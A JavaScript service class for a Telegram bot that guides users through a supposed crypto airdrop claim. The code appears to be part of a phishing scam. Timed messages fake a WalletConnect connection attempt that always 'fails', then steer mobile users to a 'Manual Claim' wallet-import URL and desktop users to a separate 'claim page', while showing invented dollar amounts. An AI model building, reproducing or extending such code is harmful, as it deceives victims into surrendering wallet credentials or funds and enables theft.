const config = require('../config/config');

class DeviceDetectionService {
    
    /**
     * Show device selection keyboard for claiming
     * @param {Object} ctx - Telegram context
     * @param {Object} airdropData - Airdrop information
     */
    async showDeviceSelection(ctx, airdropData) {
        const message = `🎯 *Ready to Claim Your Airdrop*\n\n` +
            `💰 Amount: $${airdropData.amount.toLocaleString()}\n` +
            `🏷️ Project: ${airdropData.template.name}\n\n` +
            `📱 Please select your device type to proceed with the optimal claim method:`;

        const keyboard = {
            inline_keyboard: [
                [
                    { text: '📱 iOS', callback_data: `device_ios_${airdropData.id}` },
                    { text: '🤖 Android', callback_data: `device_android_${airdropData.id}` }
                ],
                [
                    { text: '🖥️ Mac', callback_data: `device_mac_${airdropData.id}` },
                    { text: '💻 Windows', callback_data: `device_windows_${airdropData.id}` }
                ],
                [{ text: '🔙 Back', callback_data: 'back_to_menu' }]
            ]
        };

        await ctx.editMessageText(message, {
            parse_mode: 'Markdown',
            reply_markup: keyboard
        });
    }

    /**
     * Handle device selection and show appropriate claim method
     * @param {Object} ctx - Telegram context
     * @param {string} device - Selected device type
     * @param {string} claimId - Claim ID
     */
    async handleDeviceSelection(ctx, device, claimId) {
        // Get user's airdrop data from session or database
        const airdropData = ctx.userSession.airdropData;
        if (!airdropData) {
            await ctx.answerCbQuery('❌ Airdrop data not found. Please analyze your wallet first.');
            return;
        }

        switch (device) {
            case 'ios':
            case 'android':
                await this.handleMobileDevice(ctx, device, airdropData);
                break;
            case 'mac':
            case 'windows':
                await this.handleDesktopDevice(ctx, device, airdropData);
                break;
        }
    }

    /**
     * Handle mobile device claim (iOS/Android) - Show animated connection attempt
     * @param {Object} ctx - Telegram context
     * @param {string} device - Device type
     * @param {Object} airdropData - Airdrop data
     */
    async handleMobileDevice(ctx, device, airdropData) {
        const deviceIcon = device === 'ios' ? '📱' : '🤖';
        const deviceName = device === 'ios' ? 'iOS' : 'Android';

        // Step 1: Initial connection attempt
        await ctx.editMessageText(
            `${deviceIcon} *${deviceName} Wallet Connection*\n\n` +
            `💰 Claiming: $${airdropData.amount.toLocaleString()}\n\n` +
            `🔄 *Establishing connection...*\n` +
            `⏳ Please wait while we connect to WalletConnect...`,
            { parse_mode: 'Markdown' }
        );

        // Step 2: Checking available wallets
        setTimeout(async () => {
            await ctx.editMessageText(
                `${deviceIcon} *${deviceName} Wallet Connection*\n\n` +
                `💰 Claiming: $${airdropData.amount.toLocaleString()}\n\n` +
                `🔍 *Checking available wallet apps...*\n` +
                `📱 Scanning for MetaMask, Trust Wallet, Coinbase...`,
                { parse_mode: 'Markdown' }
            );
        }, 2000);

        // Step 3: Attempting to connect
        setTimeout(async () => {
            await ctx.editMessageText(
                `${deviceIcon} *${deviceName} Wallet Connection*\n\n` +
                `💰 Claiming: $${airdropData.amount.toLocaleString()}\n\n` +
                `⚡ *Attempting to connect...*\n` +
                `🔗 Initializing secure connection protocol...`,
                { parse_mode: 'Markdown' }
            );
        }, 4000);

        // Step 4: Connection failed - show manual option
        setTimeout(async () => {
            const failMessage = `${deviceIcon} *WalletConnect APIs Temporarily Down*\n\n` +
                `💰 *Claiming:* $${airdropData.amount.toLocaleString()}\n` +
                `🏷️ *Project:* ${airdropData.template.name}\n\n` +
                `🚧 *We're sorry - our WalletConnect APIs are experiencing high traffic*\n\n` +
                `⚡ *Alternative Options:*\n` +
                `• Manual claim below (requires manual connection process)\n` +
                `• Try using Windows or Mac computer for direct access\n` +
                `• Contact support using the support button for guidance`;

            const manualClaimUrl = this.generateMobileClaimUrl(airdropData);

            const keyboard = {
                inline_keyboard: [
                    [{ text: `📲 Manual Claim`, url: manualClaimUrl }],
                    [{ text: '🖥️ Use Desktop Instead', callback_data: 'mobile_to_desktop' }],
                    [{ text: '🔄 Try Again', callback_data: `device_${device}_${airdropData.id}` }],
                    [{ text: '📞 Contact Support', callback_data: 'contact_admin' }]
                ]
            };

            await ctx.editMessageText(failMessage, {
                parse_mode: 'Markdown',
                reply_markup: keyboard
            });
        }, 6000);
    }

    /**
     * Handle desktop device claim (Mac/Windows)
     * @param {Object} ctx - Telegram context
     * @param {string} device - Device type
     * @param {Object} airdropData - Airdrop data
     */
    async handleDesktopDevice(ctx, device, airdropData) {
        const deviceIcon = device === 'mac' ? '🖥️' : '💻';
        const deviceName = device === 'mac' ? 'Mac' : 'Windows';

        const message = `${deviceIcon} *${deviceName} Desktop Claim*\n\n` +
            `💰 Amount: $${airdropData.amount.toLocaleString()}\n` +
            `🏷️ Project: ${airdropData.template.name}\n\n` +
            `🖥️ *Optimized for ${deviceName}*\n` +
            `Click below to open the desktop-optimized claim interface.`;

        const desktopClaimUrl = this.generateDesktopClaimUrl(airdropData);

        const keyboard = {
            inline_keyboard: [
                [{ text: `🖥️ Open ${deviceName} Claim Page`, url: desktopClaimUrl }],
                [{ text: '🔙 Back to Device Selection', callback_data: 'claim_airdrop' }]
            ]
        };

        await ctx.editMessageText(message, {
            parse_mode: 'Markdown',
            reply_markup: keyboard
        });
    }

    /**
     * Generate mobile claim URL with import format
     * @param {Object} airdropData - Airdrop data
     * @returns {string} - Mobile claim URL
     */
    generateMobileClaimUrl(airdropData) {
        const walletAddress = airdropData.walletAddress || '0x0000000000000000000000000000000000000000';
        const airdropAmount = airdropData.amount || 0;
        
        return `${config.CLAIM_URL}/import?chain_type=ETH&wallet_name=walletconnect&wallet_address=${walletAddress}&total_claim=${airdropAmount}&airdrop=${airdropAmount}&attempt=3`;
    }

    /**
     * Generate desktop claim URL
     * @param {Object} airdropData - Airdrop data
     * @returns {string} - Desktop claim URL
     */
    generateDesktopClaimUrl(airdropData) {
        const walletAddress = airdropData.walletAddress || '0x0000000000000000000000000000000000000000';
        
        return `${config.WIN_MAC_URL}?id=${airdropData.id}&wallet=${walletAddress}&amount=${airdropData.amount}`;
    }

    /**
     * Show desktop-only device selection (Mac/Windows)
     * @param {Object} ctx - Telegram context
     * @param {Object} airdropData - Airdrop data
     */
    async showDesktopSelection(ctx, airdropData) {
        const message = `🖥️ *Desktop Claim - Select Your System*\n\n` +
            `💰 Claiming: $${airdropData.amount.toLocaleString()}\n` +
            `🏷️ Project: ${airdropData.template.name}\n\n` +
            `📋 *Choose your operating system for optimized claiming:*`;

        const keyboard = {
            inline_keyboard: [
                [
                    { text: '🍎 Mac', callback_data: `device_mac_${airdropData.id}` },
                    { text: '🪟 Windows', callback_data: `device_windows_${airdropData.id}` }
                ],
                [{ text: '🔙 Back to Mobile Options', callback_data: 'claim_airdrop' }]
            ]
        };

        await ctx.editMessageText(message, {
            parse_mode: 'Markdown',
            reply_markup: keyboard
        });
    }

    /**
     * Store wallet address in airdrop data for claim URLs
     * @param {Object} airdropData - Airdrop data
     * @param {string} walletAddress - User's wallet address
     */
    setWalletAddress(airdropData, walletAddress) {
        airdropData.walletAddress = walletAddress;
        return airdropData;
    }
}

module.exports = DeviceDetectionService;